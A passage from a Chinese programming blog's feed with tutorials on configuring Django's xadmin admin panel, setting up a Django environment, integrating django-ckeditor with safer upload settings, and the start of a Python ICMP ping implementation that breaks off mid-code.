    <content type="html"><![CDATA[<p>Django原生后台非常不友好,一般人的习惯是左右结构的系统,寻找了很久发现xadmin还是符合要求,搭建的时候要走一些坑</p><a id="more"></a><h1 id="0x01-Django后台扩展之xadmin系统搭建和优化"><a href="#0x01-Django后台扩展之xadmin系统搭建和优化" class="headerlink" title="[0x01] Django后台扩展之xadmin系统搭建和优化"></a>[0x01] Django后台扩展之xadmin系统搭建和优化</h1><p>Django-xadmin</p><blockquote><p><a href="https://github.com/sshwsfc/xadmin" target="_blank" rel="external nofollow noopener noreferrer">https://github.com/sshwsfc/xadmin</a></p></blockquote><h4 id="0x01-环境搭建"><a href="#0x01-环境搭建" class="headerlink" title="0x01 环境搭建"></a>0x01 环境搭建</h4><blockquote><p>创建完成项目后在github下源码,最好使用pip install django-xadmin </p></blockquote><hr><blockquote><p>因为这样会解决很多依赖问题可以安装完成之后再将源码放入项目文件夹内,在删除django-xadmin</p></blockquote><hr><blockquote><p>pip uninstall django-xadmin这样就会保留依赖包</p></blockquote><hr><blockquote><p>首先要设置urls.py文件注释原来的admin用xadmin替换然后import xadmin并设置URL目录<br>url(r’^xadmin/‘, xadmin.site.urls),<br>在settings.py中的INSTALLED_APPS包含’xadmin’和 ‘crispy_forms’</p></blockquote><hr><blockquote><p>如果将xadmin包放入指定文件夹内需要在项目文件夹中的settings.py下设置<br>sys.path.insert(0, os.path.join(BASE_DIR, “extra_apps”))这样项目就可以找到文件夹内所有app</p></blockquote><hr><blockquote><p>python manage.py runserver<br>访问 <a href="http://127.0.0.1:8000/xadmin" target="_blank" rel="external nofollow noopener noreferrer">http://127.0.0.1:8000/xadmin</a></p></blockquote><p>成功：<br><img src="/images/login.png" alt></p><h4 id="0x02-xadmin字段优化和修改"><a href="#0x02-xadmin字段优化和修改" class="headerlink" title="0x02 xadmin字段优化和修改"></a>0x02 xadmin字段优化和修改</h4><p>首先后台存在一个User APP 去继承系统内部的AbstractUser.在APP目录下新建adminx.py用于注册xadmin的后台管理表(增删改查)</p><p>class GlobalSetting(object):<br>    # 设置系统左上角名字<br>    site_title = ‘管理平台 v.1.0’<br>    # 设置系统底部名字<br>    site_footer = ‘版权所有’<br>    #左侧导航收缩模式<br>    menu_style = “accordion”</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">class UserDepartmentAdmin(object):</span><br><span class="line"><span class="code">    list_display = ['department_name']</span></span><br><span class="line"><span class="code">#设置导航栏图标</span></span><br><span class="line"><span class="code">    model_icon = "fa fa-sitemap"</span></span><br></pre></td></tr></table></figure><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">#注册到后台</span></span><br><span class="line">xadmin.site.register(views.CommAdminView, GlobalSetting)</span><br><span class="line">xadmin.site.register(views.BaseAdminView, BaseSetting)</span><br></pre></td></tr></table></figure><p>如果是User继承系统则在xadmin-&gt;plugins-&gt;auth.py-&gt;class UserAdmin(object)修改因为继承的类在系统内已经被注册了其他APP需要自行注册</p><p><strong>以下操作全在每个APP下面的adminx.py中的自定义类操作</strong><br>分析一些字段用法:<br>    #后台列表显示的字段<br>    list_display = (‘username’,’real_name’, ‘email’, ‘mobile’, ‘department’, ‘is_staff’)<br>    #过滤器可过滤字段<br>    list_filter = (‘username’, ‘real_name’, ‘email’, ‘mobile’, ‘is_staff’, ‘is_superuser’, ‘is_active’)<br>    #搜索栏可搜索字段<br>    search_fields = (‘username’, ‘email’, ‘mobile’)<br>    #设置只读字段<br>    readonly_fields = (‘vul_name’, ‘add_time’, ‘vul_grade’, ‘vul_url’, ‘vul_source’, ‘vul_type’, ‘vul_count’, ‘vul_control’, ‘vul_detail’, ‘vul_department’)<br>    #设置ajax方式在显示列表就可修改参数<br>    list_editable = [‘vul_status’]<br>    #列表字段每页15个<br>    list_per_page = 15<br>    #列表可导出类型<br>    list_export = (‘xls’, ‘xml’, ‘json’)<br>    #首要排序字段<br>    ordering = (‘username’,)</p><hr><pre><code>#在修改表单字段时排除一些字段比如User表中的姓和名字段exclude = (&apos;first_name&apos;, &apos;last_name&apos;)#在添加信息时可显示被添加的字段fields = (&apos;username&apos;, &apos;mobile&apos;, &apos;email&apos;, &apos;real_name&apos;, &apos;department&apos;)</code></pre><h4 id="0x03-权限控制"><a href="#0x03-权限控制" class="headerlink" title="0x03 权限控制"></a>0x03 权限控制</h4><p>现在有如下需求:<br>当我在登录一个部门权限(非管理员)我只能显示自己部门的漏洞,在adminx.py下判断当前用户是否为管理员如果不是管理员过滤当前用户的部门漏洞</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">def get<span class="emphasis">_list_</span>queryset(self):</span><br><span class="line"><span class="code">        # self.user.id获取当前登陆用户的id</span></span><br><span class="line"><span class="code">        # 判断权限,如果是超级管理员不进行过滤</span></span><br><span class="line"><span class="code">if not self.user.is_superuser:</span></span><br><span class="line"><span class="code">return super(VulProfileAdmin, self).get_list_queryset().filter(vul_department=self.user.department_id)</span></span><br><span class="line"><span class="code">return super(VulProfileAdmin, self).get_list_queryset()</span></span><br></pre></td></tr></table></figure><pre><code>def get_readonly_fields(self):    &quot;&quot;&quot;  可以限制如果不是管理员则修改一些字段时会变成只读权限  &quot;&quot;&quot;    if self.user.is_superuser:        self.readonly_fields = []    return self.readonly_fieldsreadonly_fields = (&apos;vul_name&apos;, &apos;add_time&apos;, &apos;vul_grade&apos;, &apos;vul_url&apos;, &apos;vul_source&apos;,                   &apos;vul_type&apos;, &apos;vul_count&apos;, &apos;vul_control&apos;, &apos;vul_detail&apos;, &apos;vul_department&apos;                   )</code></pre><hr><h4 id="0x05-美化操作"><a href="#0x05-美化操作" class="headerlink" title="0x05 美化操作"></a>0x05 美化操作</h4><p>因为后台TextField字段显示非常大<br>在adminx.py中添加formfield_overrides</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">修改后台textarea的宽高</span><br><span class="line"><span class="code">    formfield_overrides = &#123;</span></span><br><span class="line"><span class="code">        models.TextField: &#123;'widget': Textarea(</span></span><br><span class="line"><span class="code">            attrs=&#123;</span></span><br><span class="line"><span class="code">                    'style': 'width:50%',</span></span><br><span class="line"><span class="code">                   &#125;)&#125;,</span></span><br><span class="line"><span class="code">    &#125;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Django原生后台非常不友好,一般人的习惯是左右结构的系统,寻找了很久发现xadmin还是符合要求,搭建的时候要走一些坑&lt;/p&gt;
    
    </summary>
    
    
      <category term="编程记录" scheme="http://yoursite.com/categories/%E7%BC%96%E7%A8%8B%E8%AE%B0%E5%BD%95/"/>
    
    
  </entry>
  
  <entry>
    <title>Django编写后台系统之环境搭建</title>
    <link href="http://yoursite.com/%E7%BC%96%E7%A8%8B%E8%AE%B0%E5%BD%95/python%20Django%E7%BC%96%E5%86%99%E5%90%8E%E5%8F%B0%E7%B3%BB%E7%BB%9F%E4%B9%8B%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    <id>http://yoursite.com/%E7%BC%96%E7%A8%8B%E8%AE%B0%E5%BD%95/python%20Django%E7%BC%96%E5%86%99%E5%90%8E%E5%8F%B0%E7%B3%BB%E7%BB%9F%E4%B9%8B%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</id>
    <published>2017-07-18T08:18:48.000Z</published>
    <updated>2020-04-08T02:30:40.000Z</updated>
    
    <content type="html"><![CDATA[<p>Django开放源代码的Web应用框架，由Python语言编写,特性是大且全面</p><a id="more"></a><h1 id="0x00-Django编写后台系统之环境搭建"><a href="#0x00-Django编写后台系统之环境搭建" class="headerlink" title="[0x00] Django编写后台系统之环境搭建"></a>[0x00] Django编写后台系统之环境搭建</h1><p>我认为再构建django程序时对于<strong>数据库的理解</strong>特别重要,合理的设计表理解一对多,多对多表关系才能舒服的做出后台系统</p><h4 id="Django学习资料："><a href="#Django学习资料：" class="headerlink" title="Django学习资料："></a>Django学习资料：</h4><blockquote><p>1.8版本中文翻译文档<br> <a href="http://python.usyiyi.cn/translate/django_182/index.html" target="_blank" rel="external nofollow noopener noreferrer">http://python.usyiyi.cn/translate/django_182/index.html</a></p></blockquote><blockquote><p>1.11版本英文原版<br><a href="https://docs.djangoproject.com/en/1.11/" target="_blank" rel="external nofollow noopener noreferrer">https://docs.djangoproject.com/en/1.11/</a></p></blockquote><blockquote><p>python自强学堂(挺实用的)<br><a href="http://code.ziqiangxuetang.com/django/django-tutorial.html" target="_blank" rel="external nofollow noopener noreferrer">http://code.ziqiangxuetang.com/django/django-tutorial.html</a></p></blockquote><blockquote><p>github Django资源大全(推荐)<br><a href="https://github.com/haiiiiiyun/awesome-django-cn" target="_blank" rel="external nofollow noopener noreferrer">https://github.com/haiiiiiyun/awesome-django-cn</a></p></blockquote><h3 id="0x01-环境搭建"><a href="#0x01-环境搭建" class="headerlink" title="0x01 环境搭建"></a>0x01 环境搭建</h3><p>由于django对于版本依赖非常受限制,所以推荐使用</p><blockquote><p>编辑器:pycharm<br>环境:virtualenv<br>Django==1.9.8<br>django-xadmin<br>django-ckeditor<br>百度echarts图表自行编写app<br>都可以用pip安装</p></blockquote><p>执行命令:</p><blockquote><p>安装虚拟环境<br>pip install virtualenvwapper-win</p></blockquote><hr><blockquote><p>创建新环境<br>makevirtualenv mkvirtualenv test</p></blockquote><hr><blockquote><p>进入新环境<br>workon test<br>可用pip安装常规软件<br>(vulmanage)pip list<br>(vulmanage)pip install django==1.9.8<br>(vulmanage)pip install django-ckeditor<br>(vulmanage)pip install django-xadmin</p></blockquote><hr><p>django常用命令</p><blockquote><p>创建django项目<br>(vulmanage)django-admin startproject vulmanage</p></blockquote><hr><blockquote><p>创建django APP<br>(vulmanage)django-admin startapp vulinfo</p></blockquote><hr><blockquote><p>刷新数据库<br>(vulmanage)python manage.py makemigrations<br>(vulmanage)python manage.py migrate</p></blockquote><hr><blockquote><p>创建超级管理员<br>(vulmanage)python manage.py createsuperuser</p></blockquote><p>待补充…</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Django开放源代码的Web应用框架，由Python语言编写,特性是大且全面&lt;/p&gt;
    
    </summary>
    
    
      <category term="编程记录" scheme="http://yoursite.com/categories/%E7%BC%96%E7%A8%8B%E8%AE%B0%E5%BD%95/"/>
    
    
  </entry>
  
  <entry>
    <title>Django-ckeditor后台编辑器应用和绕坑</title>
    <link href="http://yoursite.com/%E7%BC%96%E7%A8%8B%E8%AE%B0%E5%BD%95/Django-ckeditor%E5%90%8E%E5%8F%B0%E7%BC%96%E8%BE%91%E5%99%A8%E5%BA%94%E7%94%A8%E5%92%8C%E7%BB%95%E5%9D%91/"/>
    <id>http://yoursite.com/%E7%BC%96%E7%A8%8B%E8%AE%B0%E5%BD%95/Django-ckeditor%E5%90%8E%E5%8F%B0%E7%BC%96%E8%BE%91%E5%99%A8%E5%BA%94%E7%94%A8%E5%92%8C%E7%BB%95%E5%9D%91/</id>
    <published>2017-07-18T08:17:48.000Z</published>
    <updated>2020-04-08T02:39:38.000Z</updated>
    
    <content type="html"><![CDATA[<p>在Django编辑器选择方面我推荐使用ckeditor</p><a id="more"></a><h1 id="0x01-Django-ckeditor后台编辑器应用和绕坑"><a href="#0x01-Django-ckeditor后台编辑器应用和绕坑" class="headerlink" title="[0x01] Django-ckeditor后台编辑器应用和绕坑"></a>[0x01] Django-ckeditor后台编辑器应用和绕坑</h1><p> <a href="https://github.com/django-ckeditor/django-ckeditor/" target="_blank" rel="external nofollow noopener noreferrer" title="django-ckeditor"><strong>django-ckeditor</strong></a>, star:820 - Django 管理界面与 CKEditor 集成。</p><p><a href="https://github.com/summernote/django-summernote/" target="_blank" rel="external nofollow noopener noreferrer" title="django-summernote"><strong>django-summernote</strong></a>, star:325 - Summernote 是一个简单的所见即所得编辑器。django-summernote 能将 Summernote 方便地嵌入到 Django 中。支持 mixins 和 widgets。</p><p><a href="https://github.com/aljosa/django-tinymce/" target="_blank" rel="external nofollow noopener noreferrer" title="django-tinymce"><strong>django-tinymce</strong></a>, star:615 - TinyMCE 与 Django 集成。</p><p><a href="https://github.com/pydanny/django-wysiwyg/" target="_blank" rel="external nofollow noopener noreferrer" title="django-wysiwyg"><strong>django-wysiwyg</strong></a>, star:440 - 一个 Django 应用，实现将 Django 文本框变成富文本编辑器。可用作模板标签，也可用于表单组件。</p><p>虽然百度django-ueditor还不错但是上传图片有漏洞具体可以参考以下文章:<br>在图片上传的路径可以控制文件名导致任意上传和替换原有文件非常危险</p><blockquote><p><a href="http://blog.nsfocus.net/djangoueditor-file-upload-vulnerability-analysis/" target="_blank" rel="external nofollow noopener noreferrer" title="http://blog.nsfocus.net/djangoueditor-file-upload-vulnerability-analysis/">http://blog.nsfocus.net/djangoueditor-file-upload-vulnerability-analysis/</a></p></blockquote><h4 id="0x01-安装过程"><a href="#0x01-安装过程" class="headerlink" title="0x01 安装过程"></a>0x01 安装过程</h4><p><a href="https://github.com/django-ckeditor/django-ckeditor/" target="_blank" rel="external nofollow noopener noreferrer">https://github.com/django-ckeditor/django-ckeditor/</a></p><hr><p>执行命令pip除了安装ckeditor她还会安装依赖<br>比如 django-js_assert</p><blockquote><p>pip install django-ckeditor<br>如果需要在项目里直接看到ckeditor的文件可以把github源码包中的ckeditor和ckeditor_uploader放入项目内</p></blockquote><p><strong>这里只介绍在后台添加表单时如何使用ckeditor</strong></p><hr><p>第一步:<br>在项目中的urls.py文件中加入ckeditor的目录,添加一切外部扩展都必须能让他访问否则什么操作都是无效的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ckeditor_uploader <span class="keyword">import</span> urls <span class="keyword">as</span> ckeditor_uploader_urls</span><br><span class="line">    url(<span class="string">r'^ckeditor/'</span>, include(ckeditor_uploader_urls)),</span><br></pre></td></tr></table></figure><p>然后再settings中添加APP</p><blockquote><p>settings -&gt; INSTALL_APPS 加入 ckeditor, ckeditor_uploader</p></blockquote><p>第二步:<br>再APP的后台models.py把原来TextField字段变成ckeditor的设置字段</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ckeditor.fields <span class="keyword">import</span> RichTextField</span><br><span class="line"><span class="keyword">from</span> ckeditor_uploader.fields <span class="keyword">import</span> RichTextUploadingField</span><br></pre></td></tr></table></figure><blockquote><p>RichTextField字段没有上传按钮<br>RichTextUploadingField存在上传按钮</p></blockquote><hr><p>设置字段</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vul_plan = RichTextUploadingField(verbose_name=<span class="string">'漏洞复测及修复'</span>, config_name=<span class="string">"vul"</span>)</span><br></pre></td></tr></table></figure><hr><p>初步显示成功<br><img src="/images/ckeditor.png" alt></p><h4 id="0x02-定制化编辑器"><a href="#0x02-定制化编辑器" class="headerlink" title="0x02 定制化编辑器"></a>0x02 定制化编辑器</h4><p>看到上面的<strong>config_name</strong>是用来定制化工具栏的可以设置显示哪些需要的工具和栏目的高宽等等非常方便<br>具体设置在settings.py下设置<br>具体可以看官方</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">CKEDITOR_CONFIGS = &#123;</span><br><span class="line"><span class="comment">#字典内不同的键可以在字段内进行选择</span></span><br><span class="line">    <span class="string">"vul_address"</span>: &#123;</span><br><span class="line">        <span class="string">'toolbar'</span>: <span class="string">'Basic'</span>,<span class="comment"># full,None设置工具栏复杂度</span></span><br><span class="line">        <span class="string">'height'</span>: <span class="number">200</span>,</span><br><span class="line">        <span class="string">'width'</span>: <span class="number">550</span>,</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="string">"vul"</span>: &#123;</span><br><span class="line">        <span class="string">'height'</span>: <span class="number">300</span>,</span><br><span class="line">        <span class="string">'width'</span>: <span class="number">600</span>,</span><br><span class="line">        <span class="string">'toolbar'</span>: <span class="string">'Custom'</span>,</span><br><span class="line">        <span class="string">'toolbar_Custom'</span>: [</span><br><span class="line">            &#123;<span class="string">'name'</span>: <span class="string">'styles'</span>, <span class="string">'items'</span>: [<span class="string">'Styles'</span>, <span class="string">'Format'</span>, <span class="string">'Font'</span>, <span class="string">'FontSize'</span>]&#125;,</span><br><span class="line">            &#123;<span class="string">'name'</span>: <span class="string">'yourcustomtools'</span>, <span class="string">'items'</span>: [</span><br><span class="line">                <span class="comment"># put the name of your editor.ui.addButton here</span></span><br><span class="line">                <span class="string">'Preview'</span>,</span><br><span class="line">                <span class="string">'Maximize'</span>,</span><br><span class="line">            ]&#125;,</span><br><span class="line">            <span class="string">'/'</span>,</span><br><span class="line"></span><br><span class="line">            [<span class="string">'Bold'</span>, <span class="string">'Italic'</span>, <span class="string">'Underline'</span>],</span><br><span class="line">            &#123;<span class="string">'name'</span>: <span class="string">'colors'</span>, <span class="string">'items'</span>: [<span class="string">'TextColor'</span>, <span class="string">'BGColor'</span>]&#125;,</span><br><span class="line">            [<span class="string">'JustifyLeft'</span>, <span class="string">'JustifyCenter'</span>, <span class="string">'JustifyRight'</span>, <span class="string">'JustifyBlock'</span>],</span><br><span class="line">            &#123;<span class="string">'name'</span>: <span class="string">'tools'</span>, <span class="string">'items'</span>: [<span class="string">'Maximize'</span>, <span class="string">'ShowBlocks'</span>]&#125;,</span><br><span class="line">            &#123;<span class="string">'name'</span>: <span class="string">'insert'</span>,</span><br><span class="line">             <span class="string">'items'</span>: [<span class="string">'Image'</span>, <span class="string">'Table'</span>]&#125;,</span><br><span class="line"></span><br><span class="line">            [<span class="string">'Link'</span>, <span class="string">'Unlink'</span>],</span><br><span class="line">            [<span class="string">'RemoveFormat'</span>, <span class="string">'Source'</span>],</span><br><span class="line">        ]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="0x03-编辑器上传安全应用"><a href="#0x03-编辑器上传安全应用" class="headerlink" title="0x03 编辑器上传安全应用"></a>0x03 编辑器上传安全应用</h4><p>先设置urls.py必须让后台能访问到我上传的资源才行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> 自己的项目名.settings <span class="keyword">import</span> MEDIA_ROOT</span><br><span class="line"><span class="keyword">from</span> django.views.static <span class="keyword">import</span> serve</span><br><span class="line"></span><br><span class="line">    url(<span class="string">r'^media/(?P&lt;path&gt;.*)$'</span>, serve, &#123;<span class="string">"document_root"</span>: MEDIA_ROOT&#125;),</span><br></pre></td></tr></table></figure><p>首先在settings.py下面设置</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#设置静态文件存放目录</span></span><br><span class="line">STATIC_URL = <span class="string">'/static/'</span></span><br><span class="line">STATIC_ROOT = os.path.join(BASE_DIR, <span class="string">'static'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">STATICFILES_DIRS = (</span><br><span class="line">    os.path.join(BASE_DIR, <span class="string">"static"</span>),</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">#设置媒体文件目录</span></span><br><span class="line">MEDIA_URL = <span class="string">'/media/'</span></span><br><span class="line">MEDIA_ROOT = os.path.join(BASE_DIR, <span class="string">'media'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#上传方式</span></span><br><span class="line">CKEDITOR_IMAGE_BACKEND = <span class="string">"pillow"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#上传到的目录</span></span><br><span class="line">CKEDITOR_UPLOAD_PATH = <span class="string">"vul_images"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#只允许上传图片</span></span><br><span class="line">CKEDITOR_ALLOW_NONIMAGE_FILES = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#设置上传的文件名</span></span><br><span class="line">首先在 ckeditor 目录下utils.py文件</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_uuid4_filename</span><span class="params">(filename)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Generates a uuid4 (random) filename, keeping file extension</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    :param filename: Filename passed in. In the general case, this will </span></span><br><span class="line"><span class="string">                     be provided by django-ckeditor's uploader.</span></span><br><span class="line"><span class="string">    :return: Randomized filename in urn format.</span></span><br><span class="line"><span class="string">    :rtype: str</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    discard, ext = os.path.splitext(filename)</span><br><span class="line">    basename = uuid.uuid4()</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&#123;0&#125;&#123;1&#125;'</span>.format(basename, ext)</span><br><span class="line"></span><br><span class="line">然后再settings.py下设置GENERATOR来指向这个函数,之后上传的文件名会以UUID来命名.</span><br><span class="line"></span><br><span class="line">CKEDITOR_FILENAME_GENERATOR = <span class="string">'ckeditor_uploader.utils.generate_uuid4_filename'</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在Django编辑器选择方面我推荐使用ckeditor&lt;/p&gt;
    
    </summary>
    
    
      <category term="编程记录" scheme="http://yoursite.com/categories/%E7%BC%96%E7%A8%8B%E8%AE%B0%E5%BD%95/"/>
    
    
  </entry>
  
  <entry>
    <title>利用python发送icmp包详解(ping)</title>
    <link href="http://yoursite.com/%E7%BC%96%E7%A8%8B%E8%AE%B0%E5%BD%95/%E5%88%A9%E7%94%A8python%E5%8F%91%E9%80%81icmp%E5%8C%85%E8%AF%A6%E8%A7%A3(ping)/"/>
    <id>http://yoursite.com/%E7%BC%96%E7%A8%8B%E8%AE%B0%E5%BD%95/%E5%88%A9%E7%94%A8python%E5%8F%91%E9%80%81icmp%E5%8C%85%E8%AF%A6%E8%A7%A3(ping)/</id>
    <published>2017-05-10T15:18:48.000Z</published>
    <updated>2020-04-08T02:42:28.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="利用python发送icmp包详解-ping"><a href="#利用python发送icmp包详解-ping" class="headerlink" title="利用python发送icmp包详解(ping)"></a>利用python发送icmp包详解(ping)</h1><p>ps:个人理解如有错误请指导<br>ICMP是（Internet Control Message Protocol）Internet控制报文协议。它是TCP/IP协议族的一个子协议，用于在IP主机、路由器之间传递控制消息。控制消息是指网络通不通、主机是否可达、路由是否可用等网络本身的消息。这些控制消息虽然并不传输用户数据，但是对于用户数据的传递起着重要的作用。</p><p>通俗的讲就是Ping包,icmp网络层协议所以不存在端口的概念,协议号为1让上层知道.<br>tcp,udp,ip都是采用校验和的算法,只是校验的数据所有变化.icmp会将头部和数据部分一起进行校验</p><p>维基百科关于icmp的详细解释:<br><a href="https://en.wikipedia.org/wiki/Internet_Control_Message_Protocol]" target="_blank" rel="external nofollow noopener noreferrer">https://en.wikipedia.org/wiki/Internet_Control_Message_Protocol]</a></p><p>这里关于校验和做了重要说明:<br>Checksum<br>    Error checking data, calculated from the ICMP header and data, with value 0 substituted for this field. The Internet Checksum is used, specified in RFC 1071</p><p>RFC1071讲述详细的校验过程:<br><a href="https://tools.ietf.org/html/rfc1071" target="_blank" rel="external nofollow noopener noreferrer">https://tools.ietf.org/html/rfc1071</a><br><strong>1的补码 = 反码求和</strong></p><p><strong>计算icmp的校验和必须包含header和data</strong></p><p>要发送一次icmp就必须包含图中的必选信息：<br><img src="/images/ip_b.jpg" alt="请输入图片描述"></p><p>//定义ICMP头部<br>unsigned char i_type; //8位类型<br>unsigned char i_code; //8位代码<br>unsigned short i_cksum; //16位校验和, 从TYPE开始,直到最后一位用户数据,如果为字节数为奇数则补充一位<br>unsigned short i_id ; //识别号（一般用<strong>进程号</strong>作为识别号）, 用于匹配ECHO和ECHO REPLY包<br>short i_seq ; //报文序列号, 用于标记ECHO报文顺序 <strong>可置0</strong><br>unsigned int timestamp; //时间戳 选项数据部分 <strong>可以无</strong></p><p>python格式化对照表<br><img src="/images/python_struct.jpg" alt="请输入图片描述"></p><p>现在来讲一讲实现的主要思路:</p><p>想要发送ping包首先要构造出icmp的完整包,关键就是校验和的计算方法</p><p>1.首先icmp的校验和需要头部和数据部分相加再进行校验和的运算</p><p>2.<strong>头部和数据部分相加必须为偶数</strong>,奇数补0就不用关心他了,因为我们只想实现发包,算法不过多研究</p><p>3.利用struct格式化为网络字节(类型[b],代码[b],校验和[H],识别号[H],序列号[h])第一次校验时,校验和为0,识别号一直都是进程号(os.getpid()),这就是头部的8个字节,头部和数据相加需要为偶数字节,那数据最小可以是[h]<br>struct.pack(‘bbHHh’,8,0,0,self.__id,0)</p><p>4.def __doCksum(self,packet)<br>//校验和求法:<br>//把数据报看成16比特整数序列（按网络字节顺序）<br>//对每个整数分别计算其二进制反码，然后相加<br>//再对结果计算一次二进制反码而求得<br>一般程序为了计算方便会<strong>先相加,再加上进位,最后进行取反</strong></p><p>5.再把cksum值带入原有包struct.pack(‘bbHHh’,8,0,cksum,self.__id,0)</p><p>接下来需要用python实现发送一次icmp包的过程:<br>1.需要用到socket库<br>2.格式化数据的库struct,array<br>3.生成进程id的库</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> array</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pinger</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,timeout=<span class="number">3</span>)</span>:</span></span><br><span class="line">        self.timeout = timeout</span><br><span class="line">        self.__id = os.getpid()</span><br><span class="line">        self.__data = struct.pack(<span class="string">'h'</span>,<span class="number">1</span>)<span class="comment">#h代表2个字节与头部8个字节组成偶数可进行最短校验</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__icmpSocket</span><span class="params">(self)</span>:</span><span 